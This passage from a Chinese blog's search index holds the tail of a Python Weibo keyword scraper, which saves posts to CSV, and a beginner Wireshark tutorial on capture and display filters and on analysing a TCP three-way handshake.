class="keyword">with</span> <span class="built_in">open</span>(result_file, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    writer.writerow([<span class="string">&#x27;微博ID&#x27;</span>, <span class="string">&#x27;微博发布者名称&#x27;</span>, <span class="string">&#x27;微博发布者ID&#x27;</span>, <span class="string">&#x27;微博发布者性别&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;微博发布时间&#x27;</span>, <span class="string">&#x27;微博发布来源&#x27;</span>, <span class="string">&#x27;微博内容&#x27;</span>, <span class="string">&#x27;微博发布者所在省份&#x27;</span>, <span class="string">&#x27;微博点赞数量&#x27;</span>, <span class="string">&#x27;微博评论数量&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;微博转发量&#x27;</span>])  <span class="comment"># 写入CSV文件的标题行</span></span><br><span class="line"></span><br><span class="line">    temp_data = []  <span class="comment"># 用于临时存储数据的列表</span></span><br><span class="line"></span><br><span class="line">    empty_times = <span class="number">0</span>  <span class="comment"># 空数据的连续次数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50000</span>):  <span class="comment"># 循环抓取多页数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;page: <span class="subst">&#123;page&#125;</span>&#x27;</span>)</span><br><span class="line">    json_data = get_single_page(page, keyword)  <span class="comment"># 获取单页数据</span></span><br><span class="line">    <span class="keyword">if</span> json_data == <span class="literal">None</span>:  <span class="comment"># 如果数据为空</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;json is none&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(json_data.get(<span class="string">&#x27;data&#x27;</span>).get(<span class="string">&#x27;cards&#x27;</span>)) &lt;= <span class="number">0</span>:  <span class="comment"># 检查是否有数据</span></span><br><span class="line">    empty_times += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    empty_times = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> empty_times &gt; <span class="number">3</span>:  <span class="comment"># 如果连续空数据超过3次</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n\n consist empty over 3 times \n\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> parse_page(json_data):  <span class="comment"># 解析并处理页面数据</span></span><br><span class="line">    temp_data.append(result)  <span class="comment"># 将数据添加到临时列表</span></span><br><span class="line">    <span class="keyword">if</span> page % save_per_n_page == <span class="number">0</span>:  <span class="comment"># 每隔一定页数保存一次数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(result_file, mode=<span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> temp_data:</span><br><span class="line">    <span class="comment"># 将爬取到的数据写入CSV文件</span></span><br><span class="line">    writer.writerow(</span><br><span class="line">    [d[<span class="string">&#x27;wid&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;user_name&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;user_id&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;gender&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;publish_time&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;source&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;text&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;status_province&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;like_count&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;comment_count&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;forward_count&#x27;</span>]])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\n\n------cur turn write <span class="subst">&#123;<span class="built_in">len</span>(temp_data)&#125;</span> rows to csv------\n\n&#x27;</span>)  <span class="comment"># 打印保存数据的信息</span></span><br><span class="line">    temp_data = []  <span class="comment"># 清空临时数据列表</span></span><br><span class="line">    time.sleep(random.randint(<span class="number">4</span>, <span class="number">8</span>))  <span class="comment"># 随机等待一段时间，模拟人的操作</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python爬虫项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微博爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark工具基础教程</title>
      <link href="/posts/83ab.html"/>
      <url>/posts/83ab.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、Wireshark-简介"><a href="#一、Wireshark-简介" class="headerlink" title="一、Wireshark 简介"></a>一、Wireshark 简介</h1><p>&emsp;&emsp;Wireshark是非常流行的网络封包分析软件，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程各种问题定位。本文主要内容包括：</p><p>&emsp;&emsp; 1、Wireshark软件下载和安装以及Wireshark主界面介绍。</p><p>&emsp;&emsp; 2、WireShark简单抓包示例。通过该例子学会怎么抓包以及如何简单查看分析数据包内容。</p><p>&emsp;&emsp; 3、Wireshark过滤器使用。过滤器包含两种类型，一种是抓包过滤器，就是抓取前设置过滤规则。另外一种是显示过滤器，就是在数据包分析时进行过滤数据使用。通过过滤器可以筛选出想要分析的内容。包括按照协议过滤、端口和主机名过滤、数据包内容过滤。具体规则和实例可以查看正文。</p><p><img src="https://pic.rmb.bdstatic.com/bjh/240611/5a1831bd1f8a9a8687751c8e127336e26319.jpeg" alt="img"></p><hr><h1 id="二、Wireshark-软件安装"><a href="#二、Wireshark-软件安装" class="headerlink" title="二、Wireshark 软件安装"></a>二、Wireshark 软件安装</h1><h2 id="【软件下载路径】wireshark官网"><a href="#【软件下载路径】wireshark官网" class="headerlink" title="【软件下载路径】wireshark官网"></a>【软件下载路径】<a href="https://www.wireshark.org/">wireshark官网</a></h2><p>&emsp;&emsp;按照系统版本选择下载，下载完成后，按照软件提示一路Next安装。</p><h2 id="【Windows10系统-注意事项】"><a href="#【Windows10系统-注意事项】" class="headerlink" title="【Windows10系统 注意事项】"></a>【Windows10系统 注意事项】</h2><p>&emsp;&emsp;如果你是Win10系统，安装完成后，选择抓包但是不显示网卡，下载win10pcap兼容性安装包。下载路径：<a href="http://www.win10pcap.org/download/">win10pcap兼容性安装包</a></p><hr><h1 id="三、Wireshark-开始抓包示例"><a href="#三、Wireshark-开始抓包示例" class="headerlink" title="三、Wireshark 开始抓包示例"></a>三、Wireshark 开始抓包示例</h1><p>&emsp;&emsp;  先介绍一个使用wireshark工具抓取ping命令操作的示例，让读者可以先上手操作感受一下抓包的具体过程。</p><p>&emsp;&emsp; 1、打开wireshark 2.6.5，主界面如下：</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216081023389-2002447427.png" alt="img"></p><p>&emsp;&emsp;2、选择菜单栏上Capture -&gt; Option，勾选WLAN网卡（这里需要根据各自电脑网卡使用情况选择，简单的办法可以看使用的IP对应的网卡）。点击Start。启动抓包。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216081719715-1763002076.png" alt="img"></p><p>&emsp;&emsp; 3、wireshark启动后，wireshark处于抓包状态中。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216082050941-1775919525.png" alt="img"></p><p>&emsp;&emsp; 4、执行需要抓包的操作，如在cmd窗口下执行<code>ping www.baidu.com</code>。</p><p>&emsp;&emsp; 5、操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置<br>过滤条件进行数据包列表过滤，获取结果如下。说明：<code>ip.addr == 119.75.217.26 and icmp</code> 表示<code>只显示 ICPM协议且源主机IP或者目的主机IP为119.75.217.26的数据包</code>。<br>&emsp;&emsp;<strong>【说明：协议名称icmp要小写】</strong></p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216082650625-902953031.png" alt="img"></p><p>&emsp;&emsp; 6、wireshark抓包完成，就这么简单。关于wireshark显示过滤条件、抓包过滤条件、以及如何查看数据包中的详细内容在后面介绍。</p><hr><h1 id="四、Wireshakr抓包界面介绍"><a href="#四、Wireshakr抓包界面介绍" class="headerlink" title="四、Wireshakr抓包界面介绍"></a>四、Wireshakr抓包界面介绍</h1><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216083953866-9796212.png" alt="img"></p><p>&emsp;&emsp; 【说明】数据包列表区中不同的协议使用了不同的颜色区分。协议颜色标识定位在<code>菜单栏View --&gt; Coloring Rules</code>。如下所示</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216092058380-751854098.png" alt="img"></p><p><strong>WireShark 主要分为这几个界面</strong></p><h2 id="1-Display-Filter-显示过滤器"><a href="#1-Display-Filter-显示过滤器" class="headerlink" title="1. Display Filter(显示过滤器)"></a>1. <strong>Display Filter(显示过滤器)</strong></h2><p>&emsp;&emsp;用于设置过滤条件进行数据包列表过滤。菜单路径：Analyze –&gt; Display Filters。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216161033619-451281242.png" alt="img"></p><h2 id="2-Packet-List-Pane-数据包列表"><a href="#2-Packet-List-Pane-数据包列表" class="headerlink" title="2. Packet List Pane(数据包列表)"></a>2. <strong>Packet List Pane(数据包列表)</strong></h2><p>&emsp;&emsp;显示捕获到的数据包，每个数据包包含编号，时间戳，源地址，目标地址，协议，长度，以及数据包信息。 不同协议的数据包使用了不同的颜色区分显示。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216161154412-766346180.png" alt="img"></p><h2 id="3-Packet-Details-Pane-数据包详细信息"><a href="#3-Packet-Details-Pane-数据包详细信息" class="headerlink" title="3. Packet Details Pane(数据包详细信息)"></a>3. <strong>Packet Details Pane(数据包详细信息)</strong></h2><p>&emsp;&emsp;在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看协议中的每一个字段。各行信息分别为</p><p>&emsp;&emsp; <strong>（1）Frame:  物理层的数据帧概况</strong></p><p>&emsp;&emsp; <strong>（2）Ethernet II: 数据链路层以太网帧头部信息</strong></p><p>&emsp;&emsp; <strong>（3）Internet Protocol Version 4: 互联网层IP包头部信息</strong></p><p>&emsp;&emsp; <strong>（4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP</strong></p><p>&emsp;&emsp; <strong>（5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议</strong></p><p><img src="http://www.cr173.com/up/2013-5/2013050217125736394.png" alt="img"></p><p><strong>TCP包的具体内容</strong></p><p>&emsp;&emsp; 从下图可以看到wireshark捕获到的TCP包中的每个字段。</p><p><img src="http://www.cr173.com/up/2013-5/2013050217125787134.png" alt="img"></p><h2 id="4-Dissector-Pane-数据包字节区-。"><a href="#4-Dissector-Pane-数据包字节区-。" class="headerlink" title="4. Dissector Pane(数据包字节区)。"></a>4. <strong>Dissector Pane(数据包字节区)</strong>。</h2><hr><h1 id="五、Wireshark过滤器设置"><a href="#五、Wireshark过滤器设置" class="headerlink" title="五、Wireshark过滤器设置"></a>五、Wireshark过滤器设置</h1><p>&emsp;&emsp;初学者使用wireshark时，将会得到大量的冗余数据包列表，以至于很难找到自己需要抓取的数据包部分。wireshark工具中自带了两种类型的过滤器，学会使用这两种过滤器会帮助我们在大量的数据中迅速找到我们需要的信息。</p><h2 id="（1）抓包过滤器"><a href="#（1）抓包过滤器" class="headerlink" title="（1）抓包过滤器"></a>（1）抓包过滤器</h2><p>&emsp;&emsp;  捕获过滤器的菜单栏路径为Capture –&gt; Capture Filters。用于<strong>在抓取数据包前设置。</strong></p><p><strong><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216161942199-694292737.png" alt="img"></strong></p><p>&emsp;&emsp; 如何使用？可以在抓取数据包前设置如下。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216162715878-976869768.png" alt="img"></p><p>&emsp;&emsp;<code>ip host 60.207.246.216 and icmp</code>表示只捕获<strong>主机IP为60.207.246.216的ICMP数据包</strong>。获取结果如下：</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216162922295-1140020404.png" alt="img"></p><h2 id="（2）显示过滤器"><a href="#（2）显示过滤器" class="headerlink" title="（2）显示过滤器"></a>（2）显示过滤器</h2><p>&emsp;&emsp; 显示过滤器是用于在抓取数据包后设置过滤条件进行过滤数据包。通常是在抓取数据包时设置条件相对宽泛或者没有设置导致抓取的数据包内容较多时使用显示过滤器设置条件过滤以方便分析。同样上述场景，在捕获时未设置抓包过滤规则直接通过网卡进行抓取所有数据包，如下</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216163301344-1400128534.png" alt="img"></p><p>&emsp;&emsp;执行<code>ping www.huawei.com</code>获取的数据包列表如下</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216163359260-101806867.png" alt="img"></p><p>&emsp;&emsp;观察上述获取的数据包列表，含有大量的无效数据。这时可以通过设置显示器过滤条件进行提取分析信息。<code>ip.addr == 211.162.2.183 and icmp</code>。并进行过滤。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216163607973-642074591.png" alt="img"></p><p>&emsp;&emsp; 上述介绍了抓包过滤器和显示过滤器的基本使用方法。**在组网不复杂或者流量不大情况下，使用显示器过滤器进行抓包后处理就可以满足我们使用。**下面介绍一下两者间的语法以及它们的区别。</p><hr><h1 id="六、wireshark过滤器表达式的规则"><a href="#六、wireshark过滤器表达式的规则" class="headerlink" title="六、wireshark过滤器表达式的规则"></a>六、wireshark过滤器表达式的规则</h1><h2 id="1、抓包过滤器语法和实例"><a href="#1、抓包过滤器语法和实例" class="headerlink" title="1、抓包过滤器语法和实例"></a>1、抓包过滤器语法和实例</h2><p>&emsp;&emsp;  抓包过滤器类型Type（host、net、port）、方向Dir（src、dst）、协议Proto（ether、ip、tcp、udp、http、icmp、ftp等）、逻辑运算符（&amp;&amp; 与、|| 或、！非）</p><h3 id="（1）协议过滤"><a href="#（1）协议过滤" class="headerlink" title="（1）协议过滤"></a>（1）协议过滤</h3><p>&emsp;&emsp; 比较简单，直接在抓包过滤框中直接输入协议名即可。</p><p>&emsp;&emsp; <code>tcp</code>，只显示TCP协议的数据包列表</p><p>&emsp;&emsp; <code>http</code>，只查看HTTP协议的数据包列表</p><p>&emsp;&emsp; <code>icmp</code>，只显示ICMP协议的数据包列表</p><h3 id="（2）IP过滤"><a href="#（2）IP过滤" class="headerlink" title="（2）IP过滤"></a>（2）IP过滤</h3><p>&emsp;&emsp;<code> host 192.168.1.104</code></p><p>&emsp;&emsp;<code> src host 192.168.1.104</code></p><p>&emsp;&emsp;<code> dst host 192.168.1.104</code></p><h3 id="（3）端口过滤"><a href="#（3）端口过滤" class="headerlink" title="（3）端口过滤"></a>（3）端口过滤</h3><p>&emsp;&emsp;<code> port 80</code></p><p>&emsp;&emsp;<code> src port 80</code></p><p>&emsp;&emsp;<code> dst port 80</code></p><h3 id="（4）逻辑运算符-与、-或、！非"><a href="#（4）逻辑运算符-与、-或、！非" class="headerlink" title="（4）逻辑运算符&amp;&amp; 与、|| 或、！非"></a>（4）逻辑运算符&amp;&amp; 与、|| 或、！非</h3><p>&emsp;&emsp;<code>src host 192.168.1.104 &amp;&amp; dst port 80</code> -&gt; 抓取主机地址为192.168.1.80、目的端口为80的数据包</p><p>&emsp;&emsp;<code>host 192.168.1.104 || host 192.168.1.102</code> -&gt; 抓取主机为192.168.1.104或者192.168.1.102的数据包</p><p>&emsp;&emsp; <code>！broadcast </code> -&gt; 不抓取广播数据包</p><h2 id="2、显示过滤器语法和实例"><a href="#2、显示过滤器语法和实例" class="headerlink" title="2、显示过滤器语法和实例"></a>2、显示过滤器语法和实例</h2><h3 id="（1）比较操作符"><a href="#（1）比较操作符" class="headerlink" title="（1）比较操作符"></a>（1）比较操作符</h3><p>&emsp;&emsp; 比较操作符有&#x3D;&#x3D; 等于、！&#x3D; 不等于、&gt; 大于、&lt; 小于、&gt;&#x3D; 大于等于、&lt;&#x3D;小于等于。</p><h3 id="（2）协议过滤"><a href="#（2）协议过滤" class="headerlink" title="（2）协议过滤"></a>（2）协议过滤</h3><p>&emsp;&emsp; 比较简单，直接在Filter框中直接输入协议名即可。<strong>注意：协议名称需要输入小写。</strong></p><p>&emsp;&emsp; <code>tcp</code>，只显示TCP协议的数据包列表</p><p>&emsp;&emsp; <code>http</code>，只查看HTTP协议的数据包列表</p><p>&emsp;&emsp; <code>icmp</code>，只显示ICMP协议的数据包列表</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216091233009-756441984.png" alt="img"></p><h3 id="（3）-ip过滤"><a href="#（3）-ip过滤" class="headerlink" title="（3） ip过滤"></a>（3） ip过滤</h3><p>&emsp;&emsp;  <code>ip.src ==192.168.1.104</code> 显示源地址为192.168.1.104的数据包列表</p><p>&emsp;&emsp;  <code>ip.dst==192.168.1.104</code>  显示目标地址为192.168.1.104的数据包列表</p><p>&emsp;&emsp;  <code>ip.addr == 192.168.1.104</code> 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216091553689-1436668121.png" alt="img"></p><h3 id="（4）端口过滤"><a href="#（4）端口过滤" class="headerlink" title="（4）端口过滤"></a>（4）端口过滤</h3><p>&emsp;&emsp; <code>tcp.port ==80</code>, 显示源主机或者目的主机端口为80的数据包列表。</p><p>&emsp;&emsp; <code>tcp.srcport == 80</code>, 只显示TCP协议的源主机端口为80的数据包列表。</p><p>&emsp;&emsp; <code>tcp.dstport == 80</code>，只显示TCP协议的目的主机端口为80的数据包列表。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216092151712-331226826.png" alt="img"></p><h3 id="（5）-Http模式过滤"><a href="#（5）-Http模式过滤" class="headerlink" title="（5） Http模式过滤"></a>（5） Http模式过滤</h3><p>&emsp;&emsp; <code>http.request.method==&quot;GET&quot;</code>,  只显示HTTP GET方法的。</p><h3 id="（6）逻辑运算符为-and-or-not"><a href="#（6）逻辑运算符为-and-or-not" class="headerlink" title="（6）逻辑运算符为 and&#x2F;or&#x2F;not"></a>（6）逻辑运算符为 and&#x2F;or&#x2F;not</h3><p>&emsp;&emsp; 过滤多个条件组合时，使用<code>and/or</code>。<br>&emsp;&emsp;比如获取IP地址为192.168.1.104的ICMP数据包表达式为<code>ip.addr == 192.168.1.104 and icmp</code></p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216092834478-225085029.png" alt="img"></p><h3 id="（7）按照数据包内容过滤。"><a href="#（7）按照数据包内容过滤。" class="headerlink" title="（7）按照数据包内容过滤。"></a>（7）按照数据包内容过滤。</h3><ul><li>假设我要以IMCP层中的内容进行过滤，可以单击选中界面中的码流，在下方进行选中数据。如下</li></ul><p><img src="https://img2018.cnblogs.com/blog/774327/201906/774327-20190619074816611-772694481.png" alt="img"></p><ul><li>右键单击选中后出现如下界面</li></ul><p><img src="https://img2018.cnblogs.com/blog/774327/201906/774327-20190619074945293-3644404.png" alt="img"></p><ul><li>选中Select后在过滤器中显示如下</li></ul><p><img src="https://img2018.cnblogs.com/blog/774327/201906/774327-20190619075028529-409167.png" alt="img"></p><ul><li>后面条件表达式就需要自己填写。如下我想过滤出data数据包中包含”abcd”内容的数据流。<strong>包含的关键词是contains 后面跟上内容。</strong></li></ul><p><img src="https://img2018.cnblogs.com/blog/774327/201906/774327-20190619075212180-801507805.png" alt="img"></p><p>&emsp;&emsp;看到这， 基本上对wireshak有了初步了解。</p><hr><h1 id="七、Wireshark抓包分析TCP三次握手"><a href="#七、Wireshark抓包分析TCP三次握手" class="headerlink" title="七、Wireshark抓包分析TCP三次握手"></a>七、Wireshark抓包分析TCP三次握手</h1><h2 id="（1）TCP三次握手连接建立过程"><a href="#（1）TCP三次握手连接建立过程" class="headerlink" title="（1）TCP三次握手连接建立过程"></a>（1）TCP三次握手连接建立过程</h2><ul><li><p>**Step1：**客户端发送一个SYN&#x3D;1，ACK&#x3D;0标志的数据包给服务端，请求进行连接，这是第一次握手；</p></li><li><p>**Step2：**服务端收到请求并且允许连接的话，就会发送一个SYN&#x3D;1，ACK&#x3D;1标志的数据包给发送端，告诉它，可以通讯了，并且让客户端发送一个确认数据包，这是第二次握手；</p></li><li><p>**Step3：**服务端发送一个SYN&#x3D;0，ACK&#x3D;1的数据包给客户端端，告诉它连接已被确认，这就是第三次握手。TCP连接建立，开始通讯。</p></li></ul><p><img src="http://www.cr173.com/up/2013-5/2013050217125714223.png" alt="img"></p><h2 id="（2）wireshark抓包获取访问指定服务端数据包"><a href="#（2）wireshark抓包获取访问指定服务端数据包" class="headerlink" title="（2）wireshark抓包获取访问指定服务端数据包"></a>（2）wireshark抓包获取访问指定服务端数据包</h2><ul><li><p>**Step1：**启动wireshark抓包，打开浏览器输入<code>www.huawei.com</code>。</p></li><li><p>**Step2：**使用<code>ping www.huawei.com</code>获取IP。</p></li></ul><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216104018866-329362658.png" alt="img"></p><ul><li>**Step3：**输入过滤条件获取待分析数据包列表<code> ip.addr == 211.162.2.183</code></li></ul><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216104535874-2007397893.png" alt="img"></p><p> &emsp;&emsp;图中可以看到wireshark截获到了三次握手的三个数据包。第四个包才是HTTP的， 这说明HTTP的确是使用TCP建立连接的。</p><h3 id="1-第一次握手数据包"><a href="#1-第一次握手数据包" class="headerlink" title="1. 第一次握手数据包"></a>1. 第一次握手数据包</h3><p>&emsp;&emsp;客户端发送一个TCP，标志位为SYN，序列号为0， 代表客户端请求建立连接。 如下图。</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216104744830-1050984889.png" alt="img"></p><p>&emsp;&emsp;数据包的关键属性如下：</p><p>&emsp;&emsp; <code>SYN </code>：标志位，表示请求建立连接</p><p>&emsp;&emsp; <code>Seq = 0 </code>：初始建立连接值为0，数据包的相对序列号从0开始，表示当前还没有发送数据</p><p>&emsp;&emsp; <code>Ack =0</code>：初始建立连接值为0，已经收到包的数量，表示当前没有接收到数据</p><h3 id="2-第二次握手的数据包"><a href="#2-第二次握手的数据包" class="headerlink" title="2. 第二次握手的数据包"></a>2. 第二次握手的数据包</h3><p>&emsp;&emsp;服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的I S N加1以.即0+1&#x3D;1, 如下图</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216104950687-1236457395.png" alt="img"></p><p>&emsp;&emsp; 数据包的关键属性如下：</p><p>&emsp;&emsp; <code>Seq = 0 </code>：初始建立值为0，表示当前还没有发送数据</p><p>&emsp;&emsp; <code>Ack = 1</code>：表示当前端成功接收的数据位数，虽然客户端没有发送任何有效数据，确认号还是被加1，因为包含SYN或FIN标志位。（并不会对有效数据的计数产生影响，因为含有SYN或FIN标志位的包并不携带有效数据）</p><h3 id="3-第三次握手的数据包"><a href="#3-第三次握手的数据包" class="headerlink" title="3. 第三次握手的数据包"></a>3. 第三次握手的数据包</h3><p>&emsp;&emsp; 客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1, 如下图:</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216105102440-1450961874.png" alt="img"></p><p>&emsp;&emsp;数据包的关键属性如下：</p><p>&emsp;&emsp; <code>ACK </code>：标志位，表示已经收到记录</p><p>&emsp;&emsp; <code>Seq = 1</code> ：表示当前已经发送1个数据</p><p>&emsp;&emsp; <code>Ack = 1 </code>: 表示当前端成功接收的数据位数，虽然服务端没有发送任何有效数据，确认号还是被加1，因为包含SYN或FIN标志位（并不会对有效数据的计数产生影响，因为含有SYN或FIN标志位的包并不携带有效数据)。</p><p>&emsp;&emsp; 就这样通过了TCP三次握手，建立了连接。开始进行数据交互</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216112117277-377988567.png" alt="img"></p><p>&emsp;&emsp;下面针对数据交互过程的数据包进行一些说明：</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216112320086-467982290.png" alt="img"></p><p>&emsp;&emsp;数据包的关键属性说明</p><p>&emsp;&emsp; <code>Seq: 1</code></p><p>&emsp;&emsp; <code>Ack: 1</code>: 说明现在共收到1字节数据</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216112705306-1390447949.png" alt="img"></p><p>&emsp;&emsp; <code>Seq: 1</code><br>&emsp;&emsp; <code>Ack: 951</code>: 说明现在服务端共收到951字节数据</p><p>&emsp;&emsp; 在TCP层，有个FLAGS字段，这个字段有以下几个标识：<code>SYN</code>, <code>FIN</code>, <code>ACK</code>, <code>PSH</code>, <code>RST</code>, <code>URG</code>。如下</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216113119425-2072328757.png" alt="img"></p><p>&emsp;&emsp;  其中，对于我们日常的分析有用的就是前面的五个字段。它们的含义是：</p><ul><li><code>SYN</code> 表示建立连接，</li><li><code>FIN</code> 表示关闭连接，</li><li><code>ACK</code> 表示响应，</li><li><code>PSH</code> 表示有DATA数据传输，</li><li><code>RST</code> 表示连接重置。</li></ul><hr><h1 id="八、Wireshark分析常用操作"><a href="#八、Wireshark分析常用操作" class="headerlink" title="八、Wireshark分析常用操作"></a>八、Wireshark分析常用操作</h1><p>&emsp;&emsp; 调整数据包列表中时间戳显示格式。调整方法为View –&gt;Time Display Format –&gt; Date and Time of Day。调整后格式如下：</p><p><img src="https://img2018.cnblogs.com/blog/774327/201812/774327-20181216113851595-75851722.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark使用教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
